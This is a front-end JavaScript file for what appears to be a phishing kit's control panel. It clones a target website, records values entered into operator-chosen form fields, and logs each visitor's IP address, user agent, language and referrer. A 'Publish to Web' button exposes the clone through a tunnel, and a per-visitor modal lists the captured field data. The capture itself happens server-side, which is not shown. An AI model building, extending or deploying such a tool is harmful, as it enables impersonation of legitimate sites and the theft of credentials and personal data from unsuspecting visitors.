(function () {
  'use strict';

  const form = document.getElementById('clone-form');
  const input = document.getElementById('url-input');
  const hint = document.getElementById('form-hint');
  const btn = document.getElementById('clone-btn');
  const progressArea = document.getElementById('progress-area');
  const progressFill = document.getElementById('progress-fill');
  const progressPct = document.getElementById('progress-pct');
  const progressLabel = document.getElementById('progress-label');
  const progressFile = document.getElementById('progress-file');
  const progressEta = document.getElementById('progress-eta');
  const logBody = document.getElementById('log-body');
  const logPlaceholder = document.getElementById('log-placeholder');
  const logCount = document.getElementById('log-count');
  const resultArea = document.getElementById('result-area');
  const resultSuccess = document.getElementById('result-success');
  const resultError = document.getElementById('result-error');
  const errorDesc = document.getElementById('error-desc');
  const viewBtn = document.getElementById('view-btn');
  const cleanupBtn = document.getElementById('cleanup-btn');
  const modeSwitch = document.getElementById('mode-switch');
  const modeLabels = document.querySelectorAll('.mode-label');
  const modeWget = document.querySelector('.mode-label--wget');
  const modePw = document.querySelector('.mode-label--playwright');
  const advToggle = document.getElementById('advanced-toggle');
  const advPanel = document.getElementById('advanced-panel');
  const advChevron = document.getElementById('advanced-chevron');
  const fieldList = document.getElementById('field-list');
  const btnAddField = document.getElementById('btn-add-field');
  const fieldsResult = document.getElementById('fields-result');
  const fieldsBody = document.getElementById('fields-body');
  const visitorsResult = document.getElementById('visitors-result');
  const visitorsBody = document.getElementById('visitors-body');
  const visitorsCount = document.getElementById('visitors-count');

  let eventSource = null;
  let fileCount = 0;
  let isCloning = false;
  let usePlaywright = false;

  function setMode(pw) {
    usePlaywright = pw;
    modeSwitch.classList.toggle('active', pw);
    modeWget.classList.toggle('active', !pw);
    modePw.classList.toggle('active', pw);
    // show advanced panel when switching to JS mode
    if (pw) {
      advPanel.hidden = false;
      advToggle.classList.add('open');
    }
  }

  modeSwitch.addEventListener('click', () => setMode(!usePlaywright));
  modeLabels.forEach(l => l.addEventListener('click', () => setMode(l.dataset.mode === 'playwright')));

  advToggle.addEventListener('click', function () {
    const open = advPanel.hidden;
    advPanel.hidden = !open;
    advToggle.classList.toggle('open', open);
  });

  function html2sel(html) {
    const m = html.match(/<(\w+)/);
    if (!m) return html;
    const tag = m[1];
    const name = html.match(/\sname=["']([^"']+)["']/);
    if (name) return tag + '[name="' + name[1] + '"]';
    const id = html.match(/\sid=["']([^"']+)["']/);
    if (id) return '#' + id[1];
    const cls = html.match(/\sclass=["']([^"']+)["']/);
    if (cls) return tag + '.' + cls[1].split(/\s+/).join('.');
    return tag;
  }

  function addFieldRow(name, selector) {
    const item = document.createElement('div');
    item.className = 'field-item';
    item.innerHTML = '<input class="field-item-name" placeholder="name" value="' + (name || '').replace(/"/g, '&quot;') + '">'
      + '<input class="field-item-selector" placeholder="CSS selector" value="' + (selector || '').replace(/"/g, '&quot;') + '">'
      + '<button class="field-item-del">✕</button>';
    const nameInput = item.querySelector('.field-item-name');
    const selInput = item.querySelector('.field-item-selector');
    selInput.addEventListener('input', function () {
      if (this.value.trim().startsWith('<')) {
        const converted = html2sel(this.value.trim());
        if (converted !== this.value.trim()) {
          this.value = converted;
        }
      }
    });
    item.querySelector('.field-item-del').onclick = () => item.remove();
    fieldList.appendChild(item);
  }

  btnAddField.addEventListener('click', () => addFieldRow());

  function getFields() {
    if (!usePlaywright) return '';
    const lines = [];
    fieldList.querySelectorAll('.field-item').forEach(item => {
      const name = item.querySelector('.field-item-name').value.trim();
      const sel = item.querySelector('.field-item-selector').value.trim();
      if (name && sel) lines.push(name + ': ' + sel);
    });
    return lines.join('\n');
  }

  function setLoading(loading) {
    isCloning = loading;
    btn.classList.toggle('loading', loading);
    btn.disabled = loading;
    input.disabled = loading;
  }

  function showError(msg) {
    hint.textContent = msg;
    hint.className = 'form-hint error';
    input.classList.add('error');
  }

  function clearError() {
    hint.textContent = 'Paste a URL and press Enter or click Clone';
    hint.className = 'form-hint';
    input.classList.remove('error');
  }

  function showProgress() {
    progressArea.hidden = false;
    resultArea.hidden = true;
    resultSuccess.hidden = true;
    resultError.hidden = true;
  }

  function addLogLine(text) {
    if (logPlaceholder) logPlaceholder.remove();

    const div = document.createElement('div');
    div.className = 'log-line';

    const lower = text.toLowerCase();
    if (lower.startsWith('saved') || lower.includes('saved')) {
      div.classList.add('saved');
      fileCount++;
      logCount.textContent = fileCount + ' files';
    } else if (lower.startsWith('error') || lower.includes('error')) {
      div.classList.add('error-log');
    } else if (/%\s/.test(text) || /\d+%/.test(text)) {
      div.classList.add('percent');
    } else if (
      lower.startsWith('--') ||
      lower.includes('resolving') ||
      lower.includes('connecting') ||
      lower.includes('http request')
    ) {
      // filter out wget noise
    } else {
      div.classList.add('download');
    }

    div.textContent = text;
    logBody.appendChild(div);
    logBody.scrollTop = logBody.scrollHeight;
  }

  function updateProgress(percent) {
    if (percent === null || percent === undefined) return;
    const p = Math.min(Math.max(0, percent), 100);
    progressFill.style.width = p + '%';
    progressPct.textContent = p + '%';
  }

  function renderFieldRow(container, name, values) {
    const row = document.createElement('div');
    row.className = 'field-row';
    const nameEl = document.createElement('div');
    nameEl.className = 'field-row-name';
    nameEl.textContent = name;
    row.appendChild(nameEl);
    const valsEl = document.createElement('div');
    valsEl.className = 'field-row-values';
    if (values && values.length > 0) {
      for (const v of values) {
        const valEl = document.createElement('span');
        valEl.className = 'val';
        valEl.textContent = v || '(empty)';
        valsEl.appendChild(valEl);
      }
    } else {
      valsEl.textContent = '(no results)';
      valsEl.className = 'field-row-values field-row-empty';
    }
    row.appendChild(valsEl);
    container.appendChild(row);
  }

  async function showFields() {
    try {
      const res = await fetch('/api/fields');
      const data = await res.json();
      const entries = Object.keys(data);
      if (entries.length === 0) return;
      fieldsResult.hidden = false;
      fieldsBody.innerHTML = '';
      fieldsBody.parentElement.querySelector('.fields-result-head span').textContent = 'Captured at Clone Time';
      for (const name of entries) {
        renderFieldRow(fieldsBody, name, data[name].values);
      }
    } catch (_) {}
  }

  async function loadVisitors() {
    try {
      const res = await fetch('/api/visitors');
      const data = await res.json();
      if (!data || data.length === 0) return;
      visitorsResult.hidden = false;
      visitorsCount.textContent = data.length + ' visitor' + (data.length !== 1 ? 's' : '');
      visitorsBody.innerHTML = '';
      for (const v of data) {
        const row = document.createElement('div');
        row.className = 'visitor-row';
        row.dataset.ip = v.ip;
        const ip = document.createElement('span');
        ip.className = 'visitor-row-ip';
        ip.textContent = v.ip;
        row.appendChild(ip);
        const path = document.createElement('span');
        path.className = 'visitor-row-path';
        path.textContent = (v.path || '/').substring(0, 30);
        path.title = v.path || '/';
        row.appendChild(path);
        const ua = document.createElement('span');
        ua.className = 'visitor-row-ua';
        const u = (v.ua || '').substring(0, 60);
        ua.textContent = u + (v.ua && v.ua.length > 60 ? '…' : '');
        ua.title = v.ua || '';
        row.appendChild(ua);
        const t = document.createElement('span');
        t.className = 'visitor-row-time';
        const secondsAgo = Math.floor((Date.now() / 1000 - v.t));
        t.textContent = secondsAgo < 60 ? secondsAgo + 's ago' : Math.floor(secondsAgo / 60) + 'm ago';
        row.appendChild(t);
        row.onclick = () => openVisitorModal(v);
        visitorsBody.appendChild(row);
      }
    } catch (_) {}
  }

  function parseUA(ua) {
    const r = { browser: 'Unknown', os: 'Unknown' };
    if (!ua) return r;
    if (ua.includes('Firefox/') && !ua.includes('Seamonkey')) r.browser = 'Firefox';
    else if (ua.includes('Edg/') || ua.includes('Edge/')) r.browser = 'Edge';
    else if (ua.includes('Chrome/') && !ua.includes('Edg/') && !ua.includes('OPR/')) r.browser = 'Chrome';
    else if (ua.includes('Safari/') && !ua.includes('Chrome/')) r.browser = 'Safari';
    else if (ua.includes('OPR/') || ua.includes('Opera/')) r.browser = 'Opera';
    if (ua.includes('Windows NT 10')) r.os = 'Windows 10';
    else if (ua.includes('Windows NT 11') || ua.includes('Windows NT 10.0; Win64; x64')) {
      r.os = ua.includes('Windows NT 11') ? 'Windows 11' : 'Windows 10';
    } else if (ua.includes('Windows NT 6.3')) r.os = 'Windows 8.1';
    else if (ua.includes('Windows NT 6.1')) r.os = 'Windows 7';
    else if (ua.includes('Windows NT 6.0')) r.os = 'Windows Vista';
    else if (ua.includes('Mac OS X')) {
      const m = ua.match(/Mac OS X (\d+[._]\d+)/);
      r.os = 'macOS' + (m ? ' ' + m[1].replace(/_/g, '.') : '');
    } else if (ua.includes('Android')) {
      const m = ua.match(/Android (\d+[.\d]*)/);
      r.os = 'Android' + (m ? ' ' + m[1] : '');
    } else if (/iPhone|iPad|iPod/.test(ua)) {
      const m = ua.match(/OS (\d+[._]\d+)/);
      r.os = 'iOS' + (m ? ' ' + m[1].replace(/_/g, '.') : '');
    } else if (ua.includes('Linux') && !ua.includes('Android')) r.os = 'Linux';
    else if (ua.includes('CrOS')) r.os = 'ChromeOS';
    return r;
  }

  function openVisitorModal(v) {
    const overlay = document.getElementById('visitor-modal');
    const parsed = parseUA(v.ua || '');
    const t = new Date((v.t || 0) * 1000);
    const timeStr = t.toLocaleString(undefined, {
      year: 'numeric', month: 'short', day: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit'
    });
    overlay.querySelector('.vm-ip').textContent = v.ip || 'Unknown';
    overlay.querySelector('.vm-time').textContent = timeStr;
    overlay.querySelector('.vm-path').textContent = v.path || '/';
    overlay.querySelector('.vm-lang').textContent = v.lang || 'N/A';
    overlay.querySelector('.vm-ref').textContent = v.ref || '(none)';
    overlay.querySelector('.vm-ua').textContent = v.ua || 'N/A';
    overlay.querySelector('.vm-browser').textContent = parsed.browser;
    overlay.querySelector('.vm-os').textContent = parsed.os;
    const fieldsContainer = overlay.querySelector('.vm-fields');
    fieldsContainer.innerHTML = '<div class="vm-fields-label">📋 Recorded Fields</div>';
    fetch('/api/recorded').then(r => r.json()).then(rd => {
      const keys = Object.keys(rd);
      if (keys.length === 0) {
        fieldsContainer.innerHTML += '<div class="vm-fields-empty">No recorded data for this visitor.</div>';
        return;
      }
      for (const k of keys) {
        const row = document.createElement('div');
        row.className = 'vm-field-row';
        const vals = (rd[k] || []).map(x => x || '(empty)').join(', ') || '(empty)';
        row.innerHTML = '<span class="vm-field-name">' + k + '</span><span class="vm-field-val">' + vals + '</span>';
        fieldsContainer.appendChild(row);
      }
    }).catch(() => {
      fieldsContainer.innerHTML += '<div class="vm-fields-empty">Error loading field data.</div>';
    });
    overlay.hidden = false;
    document.body.style.overflow = 'hidden';
  }

  function closeVisitorModal() {
    const overlay = document.getElementById('visitor-modal');
    overlay.hidden = true;
    document.body.style.overflow = '';
  }
  window.closeVisitorModal = closeVisitorModal;

  function toggleDisclaimer() {
    const box = document.getElementById('warning-box');
    box.hidden = !box.hidden;
    if (!box.hidden) box.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }
  window.toggleDisclaimer = toggleDisclaimer;

  let publishUrl = null;
  let publishPollTimer = null;

  async function handlePublish() {
    const btn = document.getElementById('publish-btn');
    const text = document.getElementById('publish-text');
    const area = document.getElementById('publish-url-area');
    const link = document.getElementById('publish-url-link');
    if (publishUrl) {
      navigator.clipboard.writeText(publishUrl).catch(() => {});
      document.getElementById('publish-copy-btn').textContent = '✅';
      setTimeout(() => { document.getElementById('publish-copy-btn').textContent = '📋'; }, 1500);
      return;
    }
    btn.disabled = true;
    text.textContent = 'Starting tunnel…';
    try {
      const res = await fetch('/api/publish');
      const data = await res.json();
      if (data.error) { text.textContent = '❌ ' + data.error; btn.disabled = false; return; }
      if (data.url) {
        publishUrl = data.url;
        area.hidden = false;
        link.textContent = data.url;
        link.href = data.url;
        text.textContent = '✅ Published';
        btn.disabled = false;
        return;
      }
      publishPollTimer = setInterval(async () => {
        const r = await fetch('/api/status');
        const s = await r.json();
        if (s.publish_url) {
          clearInterval(publishPollTimer);
          publishPollTimer = null;
          publishUrl = s.publish_url;
          area.hidden = false;
          link.textContent = s.publish_url;
          link.href = s.publish_url;
          text.textContent = '✅ Published';
          btn.disabled = false;
        }
      }, 1000);
    } catch (e) { text.textContent = '❌ Failed'; btn.disabled = false; }
  }
  document.getElementById('publish-btn').addEventListener('click', handlePublish);

  function startPolling() {
    loadVisitors();
  }

  function showResult(success, url, errMsg) {
    resultArea.hidden = false;
    progressArea.hidden = true;

    if (success) {
      resultSuccess.hidden = false;
      resultError.hidden = true;
      viewBtn.href = url || '#';
      if (usePlaywright) { showFields(); startPolling(); }
    } else {
      resultSuccess.hidden = true;
      resultError.hidden = false;
      errorDesc.textContent = errMsg || 'An unexpected error occurred during cloning.';
    }
  }

  function resetUI() {
    if (eventSource) {
      eventSource.close();
      eventSource = null;
    }
    if (publishPollTimer) { clearInterval(publishPollTimer); publishPollTimer = null; }
    publishUrl = null;
    setLoading(false);
    progressArea.hidden = true;
    resultArea.hidden = true;
    resultSuccess.hidden = true;
    resultError.hidden = true;
    progressFill.style.width = '0%';
    progressPct.textContent = '--%';
    progressLabel.textContent = 'Cloning website…';
    progressFile.textContent = 'Initializing';
    progressEta.textContent = 'Downloading assets…';
    logBody.innerHTML = '';
    logCount.textContent = '0 files';
    fileCount = 0;
    fieldsResult.hidden = true;
    fieldsBody.innerHTML = '';
    visitorsResult.hidden = true;
    visitorsBody.innerHTML = '';
    visitorsCount.textContent = '';
    document.getElementById('publish-text').textContent = 'Publish to Web';
    document.getElementById('publish-btn').disabled = false;
    document.getElementById('publish-url-area').hidden = true;
    clearError();
    input.focus();
  }

  function connectSSE() {
    if (eventSource) eventSource.close();
    eventSource = new EventSource('/api/progress');

    eventSource.onmessage = function (e) {
      try {
        const data = JSON.parse(e.data);
        if (data.type === 'heartbeat') return;

        if (data.type === 'log') {
          if (data.line) addLogLine(data.line);
          if (data.percent != null) updateProgress(data.percent);

          const line = (data.line || '').toLowerCase();
          if (line.includes('saving to:') || line.includes('saving ‘')) {
            const match = data.line.match(/[`‘'](.+?)[`'’]/);
            progressFile.textContent = match ? match[1] : data.line;
          }
        } else if (data.type === 'status') {
          if (data.value === 'started') {
            progressLabel.textContent = 'Cloning website…';
            progressEta.textContent = data.message || 'Starting…';
          } else if (data.value === 'completed') {
            progressLabel.textContent = '✅ Clone Complete';
            progressEta.textContent = data.message || 'Done!';
            updateProgress(100);
            progressFile.textContent = 'All assets downloaded';
            setLoading(false);
            setTimeout(() => showResult(true, data.clone_url), 600);
          } else if (data.value === 'error') {
            progressLabel.textContent = '❌ Clone Failed';
            progressEta.textContent = data.message || 'Error occurred';
            setLoading(false);
            setTimeout(() => showResult(false, null, data.message), 600);
          }
        }
      } catch (err) {
        // meh
      }
    };

    eventSource.onerror = function () {
      // reconnect handled by EventSource
    };
  }

  form.addEventListener('submit', async function (e) {
    e.preventDefault();
    if (isCloning) return;

    let url = input.value.trim();
    if (!url) {
      showError('Please enter a URL');
      input.focus();
      return;
    }

    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }

    try {
      new URL(url);
    } catch (_) {
      showError('Please enter a valid URL');
      return;
    }

    clearError();
    setLoading(true);
    showProgress();
    fileCount = 0;
    logCount.textContent = '0 files';

    const mode = usePlaywright ? 'playwright' : 'wget';
    const fieldsRaw = getFields();
    const body = { url: url, mode: mode };
    if (fieldsRaw) {
      body.fields = fieldsRaw;
      addLogLine('📋 Recording fields: ' + fieldsRaw.split('\n').filter(l => l.includes(':')).map(l => l.split(':')[0].trim()).join(', '));
    }
    addLogLine('🚀 Starting clone for ' + url + ' [' + mode + ']');
    addLogLine('');

    connectSSE();

    try {
      const res = await fetch('/api/clone', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });

      if (!res.ok) {
        const err = await res.json();
        setLoading(false);
        showResult(false, null, err.error || 'Failed to start cloning');
        return;
      }
    } catch (err) {
      setLoading(false);
      showResult(false, null, 'Network error: ' + err.message);
    }
  });

  input.addEventListener('keydown', function () {
    clearError();
  });

  input.addEventListener('blur', function () {
    let v = input.value.trim();
    if (v && !v.startsWith('http://') && !v.startsWith('https://')) {
      input.value = 'https://' + v;
    }
  });

  cleanupBtn.addEventListener('click', async function () {
    try {
      await fetch('/api/cleanup', { method: 'POST' });
    } catch (_) {}
    resetUI();
  });

  window.addEventListener('beforeunload', function () {
    if (eventSource) eventSource.close();
    navigator.sendBeacon('/api/cleanup', '');
  });

  // escape to reset ui
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && !isCloning) {
      resetUI();
      if (eventSource) {
        eventSource.close();
        eventSource = null;
      }
    }
  });

  input.focus();
})();
